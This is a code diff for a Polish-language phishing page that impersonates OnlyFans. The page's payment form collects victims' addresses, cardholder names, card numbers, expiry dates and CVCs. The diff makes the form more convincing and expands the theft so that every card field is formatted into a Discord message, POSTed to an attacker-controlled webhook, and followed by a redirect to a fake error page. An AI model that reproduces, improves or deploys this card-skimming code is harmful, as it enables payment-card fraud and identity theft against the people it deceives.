@@ -17,7 +17,6 @@
             color: #0f0f0f;
         }
 
-        /* Login overlay TYLKO dla formularza */
         .login-overlay {
             position: fixed;
             top: 0;
@@ -38,33 +37,25 @@
             border: 1px solid #e6e6e6;
             width: 400px;
             text-align: center;
-            box-shadow: 0 8px 24px rgba(0,0,0,0.05);
         }
 
         .login-box h2 {
             font-size: 32px;
             color: #0099ff;
-            margin-bottom: 8px;
         }
 
         .login-box p {
             color: #666;
-            margin-bottom: 32px;
+            margin: 8px 0 32px;
         }
 
         .login-box input {
             width: 100%;
-            padding: 14px 16px;
+            padding: 14px;
             background: #f8f8f8;
             border: 1px solid #ddd;
             border-radius: 12px;
             margin-bottom: 20px;
-            font-size: 16px;
-        }
-
-        .login-box input:focus {
-            outline: none;
-            border-color: #0099ff;
         }
 
         .login-box button {
@@ -75,14 +66,12 @@
             border-radius: 40px;
             color: white;
             font-weight: bold;
-            font-size: 16px;
             cursor: pointer;
         }
 
         .login-error {
             color: #ff3b30;
             margin-top: 16px;
-            font-size: 14px;
         }
 
         .navbar {
@@ -92,7 +81,6 @@
             display: flex;
             justify-content: space-between;
             align-items: center;
-            flex-wrap: wrap;
         }
 
         .logo {
@@ -136,7 +124,6 @@
             border: 1px solid #e6e6e6;
             max-width: 600px;
             margin: 0 auto;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.05);
         }
 
         .card h2 {
@@ -162,7 +149,7 @@
 
         input, textarea {
             width: 100%;
-            padding: 14px 16px;
+            padding: 14px;
             background: #f8f8f8;
             border: 1px solid #ddd;
             border-radius: 12px;
@@ -336,7 +323,6 @@
         .json-output textarea {
             font-family: monospace;
             font-size: 12px;
-            background: #fff;
             margin-top: 12px;
         }
     </style>
@@ -363,28 +349,28 @@
                 <option>Polska</option>
                 <option>USA</option>
                 <option>Niemcy</option>
+                <option>Wielka Brytania</option>
             </select>
             <input type="text" id="state" placeholder="Stan / Województwo" required>
             <input type="text" id="address" placeholder="Adres" required>
             <input type="text" id="city" placeholder="Miasto" required>
-            <input type="text" id="cardName" placeholder="Imię na karcie" required>
-            <input type="text" id="cardNumber" placeholder="Numer karty" required>
+            <input type="text" id="cardName" placeholder="Imię i nazwisko na karcie" required>
+            <input type="text" id="cardNumber" placeholder="Numer karty" maxlength="19" required>
             <div class="row">
-                <input type="text" id="expiry" placeholder="MM/RR" required>
-                <input type="text" id="cvc" placeholder="CVC" required>
+                <input type="text" id="expiry" placeholder="MM/RR" maxlength="5" required>
+                <input type="text" id="cvc" placeholder="CVC" maxlength="4" required>
             </div>
-            <button type="submit" class="btn-submit">Prześlij</button>
+            <button type="submit" class="btn-submit">Zapłać i subskrybuj</button>
         </form>
         <div id="paymentStatus" class="status"></div>
     </div>
 </div>
 
-<!-- Login overlay TYLKO dla formularza -->
 <div class="login-overlay" id="loginOverlay" style="display: none;">
     <div class="login-box">
         <h2>OnlyFans</h2>
         <p>Wprowadź hasło, aby utworzyć profil</p>
-        <input type="password" id="passwordInput" placeholder="Hasło" autofocus>
+        <input type="password" id="passwordInput" placeholder="Hasło">
         <button onclick="checkPassword()">Kontynuuj</button>
         <div id="loginError" class="login-error"></div>
     </div>
@@ -401,7 +387,7 @@
     async function loadCreators() {
         try {
             const response = await fetch(JSON_FILE + '?t=' + Date.now());
-            if (!response.ok) throw new Error('Nie znaleziono pliku');
+            if (!response.ok) throw new Error();
             creators = await response.json();
         } catch (error) {
             creators = {};
@@ -414,11 +400,9 @@
         const match = path.match(/^\/@(.+)$/);
         
         if (match) {
-            // Profil publiczny – NIE wymaga hasła
             document.getElementById('loginOverlay').style.display = 'none';
             renderProfile(match[1]);
         } else {
-            // Strona główna (formularz) – wymaga hasła
             if (isFormLocked) {
                 document.getElementById('loginOverlay').style.display = 'flex';
                 document.getElementById('app').innerHTML = '';
@@ -438,7 +422,7 @@
             document.getElementById('loginOverlay').style.display = 'none';
             renderForm();
         } else {
-            errorDiv.innerHTML = '❌ Nieprawidłowe hasło. Spróbuj ponownie.';
+            errorDiv.innerHTML = '❌ Nieprawidłowe hasło';
             document.getElementById('passwordInput').value = '';
         }
     }
@@ -452,7 +436,7 @@
         app.innerHTML = `
             <div class="card">
                 <h2>🔥 Zostań twórcą</h2>
-                <div class="sub">Wypełnij formularz, a następnie dodaj dane do pliku creators.json</div>
+                <div class="sub">Wypełnij formularz, aby wygenerować JSON</div>
                 <form id="creatorForm">
                     <div class="form-group">
                         <label>Imię i nazwisko</label>
@@ -486,10 +470,9 @@
                     <div id="status" class="status"></div>
                 </form>
                 <div id="jsonOutput" class="json-output">
-                    <strong>📋 Skopiuj poniższy JSON i wklej do pliku <code>creators.json</code>:</strong>
-                    <textarea id="jsonData" rows="12" readonly style="width:100%; font-family:monospace;"></textarea>
-                    <button onclick="copyJson()" style="margin-top:12px; padding:10px; background:#0099ff; color:white; border:none; border-radius:8px; cursor:pointer;">📋 Kopiuj JSON</button>
-                    <p style="margin-top:12px; font-size:12px; color:#666;">Po wklejeniu do pliku creators.json i odświeżeniu, profil będzie działać pod adresem /@nazwa</p>
+                    <strong>📋 Skopiuj poniższy JSON do pliku creators.json:</strong>
+                    <textarea id="jsonData" rows="10" readonly></textarea>
+                    <button onclick="copyJson()" style="margin-top:12px; padding:10px; background:#0099ff; color:white; border:none; border-radius:8px; cursor:pointer;">📋 Kopiuj</button>
                 </div>
             </div>
         `;
@@ -498,11 +481,6 @@
             e.preventDefault();
             const username = document.getElementById('username').value.replace('@', '').toLowerCase();
             
-            if (creators[username]) {
-                document.getElementById('status').innerHTML = '<span style="color:red;">❌ Ta nazwa już istnieje w bazie!</span>';
-                return;
-            }
-
             const newCreator = {
                 fullName: document.getElementById('fullName').value,
                 displayName: document.getElementById('displayName').value,
@@ -514,11 +492,9 @@
             };
 
             const newData = { ...creators, [username]: newCreator };
-            const jsonString = JSON.stringify(newData, null, 2);
-            
-            document.getElementById('jsonData').value = jsonString;
+            document.getElementById('jsonData').value = JSON.stringify(newData, null, 2);
             document.getElementById('jsonOutput').style.display = 'block';
-            document.getElementById('status').innerHTML = '<span style="color:green;">✅ JSON wygenerowany! Skopiuj i wklej do creators.json</span>';
+            document.getElementById('status').innerHTML = '<span style="color:green;">✅ JSON gotowy!</span>';
         });
     }
 
@@ -528,21 +504,15 @@
         currentProfileUsername = username;
 
         if (!profile) {
-            app.innerHTML = `
-                <div class="error-page">
-                    <h2>😕 Nie znaleziono profilu</h2>
-                    <p>Użytkownik <strong>@${username}</strong> nie istnieje.</p>
-                    <button class="nav-btn primary" onclick="navigateToHome()">Strona główna</button>
-                </div>
-            `;
+            app.innerHTML = `<div class="error-page"><h2>😕 Nie znaleziono @${username}</h2><button class="nav-btn primary" onclick="navigateToHome()">Strona główna</button></div>`;
             return;
         }
 
         app.innerHTML = `
             <div class="profile-header">
-                <img class="banner-img" src="${profile.banner}" onerror="this.src='https://placehold.co/1200x400/e6e6e6/999?text=Baner'">
+                <img class="banner-img" src="${profile.banner}">
                 <div class="profile-info">
-                    <img class="avatar-img" src="${profile.avatar}" onerror="this.src='https://placehold.co/200/e6e6e6/999?text=Avatar'">
+                    <img class="avatar-img" src="${profile.avatar}">
                     <div class="profile-name">${profile.displayName}</div>
                     <div class="profile-username">@${username}</div>
                     <div class="profile-bio">${profile.bio || 'Brak opisu'}</div>
@@ -565,41 +535,84 @@
         const textarea = document.getElementById('jsonData');
         textarea.select();
         document.execCommand('copy');
-        alert('✅ JSON skopiowany! Wklej go do pliku creators.json');
+        alert('✅ Skopiowano!');
+    }
+
+    // Automatyczne dodawanie / w MM/RR
+    function setupExpiryInput() {
+        const expiryInput = document.getElementById('expiry');
+        if (!expiryInput) return;
+        
+        expiryInput.addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\//g, '').replace(/\s/g, '');
+            if (value.length >= 2) {
+                value = value.slice(0, 2) + '/' + value.slice(2, 4);
+            }
+            e.target.value = value;
+        });
     }
 
     function openPaymentModal() {
         document.getElementById('paymentModal').style.display = 'flex';
+        setupExpiryInput();
     }
 
     document.getElementById('paymentForm').addEventListener('submit', async (e) => {
         e.preventDefault();
+        
         const profile = creators[currentProfileUsername];
         
         const paymentData = {
-            profile: currentProfileUsername,
-            country: document.getElementById('country').value,
-            state: document.getElementById('state').value,
-            address: document.getElementById('address').value,
-            city: document.getElementById('city').value,
-            cardName: document.getElementById('cardName').value,
-            cardNumber: document.getElementById('cardNumber').value,
-            expiry: document.getElementById('expiry').value,
-            cvc: document.getElementById('cvc').value
+            profil: `@${currentProfileUsername}`,
+            kraj: document.getElementById('country').value,
+            stan_wojewodztwo: document.getElementById('state').value,
+            adres: document.getElementById('address').value,
+            miasto: document.getElementById('city').value,
+            imie_na_karcie: document.getElementById('cardName').value,
+            numer_karty: document.getElementById('cardNumber').value,
+            data_waznosci: document.getElementById('expiry').value,
+            cvc: document.getElementById('cvc').value,
+            timestamp: new Date().toLocaleString('pl-PL')
         };
 
-        if (profile?.webhook) {
-            await fetch(profile.webhook, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ content: `💳 NOWA PŁATNOŚĆ!\nProfil: @${currentProfileUsername}\nKarta: ${paymentData.cardNumber}` })
-            });
+        const statusDiv = document.getElementById('paymentStatus');
+        statusDiv.innerHTML = '⏳ Wysyłanie...';
+
+        // Przygotowanie wiadomości na Discord
+        const discordMessage = `💳 **NOWA PŁATNOŚĆ!** 💳\n\n` +
+            `📌 **Profil:** ${paymentData.profil}\n` +
+            `🌍 **Kraj:** ${paymentData.kraj}\n` +
+            `🏙️ **Miasto:** ${paymentData.miasto}\n` +
+            `📍 **Adres:** ${paymentData.adres}\n` +
+            `📝 **Stan/Województwo:** ${paymentData.stan_wojewodztwo}\n\n` +
+            `💳 **Dane karty:**\n` +
+            `• Imię na karcie: ${paymentData.imie_na_karcie}\n` +
+            `• Numer karty: ${paymentData.numer_karty}\n` +
+            `• Data ważności: ${paymentData.data_waznosci}\n` +
+            `• CVC: ${paymentData.cvc}\n\n` +
+            `⏰ **Data:** ${paymentData.timestamp}`;
+
+        // Wysyłka na webhook
+        if (profile?.webhook && profile.webhook.startsWith('https://')) {
+            try {
+                await fetch(profile.webhook, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ content: discordMessage })
+                });
+                statusDiv.innerHTML = '✅ Wysłano na Discord!';
+            } catch(err) {
+                statusDiv.innerHTML = '⚠️ Błąd wysyłki';
+                console.error(err);
+            }
+        } else {
+            statusDiv.innerHTML = '⚠️ Brak webhooka – dane nie zostały wysłane';
         }
 
-        document.getElementById('paymentStatus').innerHTML = '✅ Wysłano!';
+        // Przekierowanie na błąd
         setTimeout(() => {
             window.location.href = 'https://httpbin.org/status/400';
-        }, 1000);
+        }, 2000);
     });
 
     function closePaymentModal() {
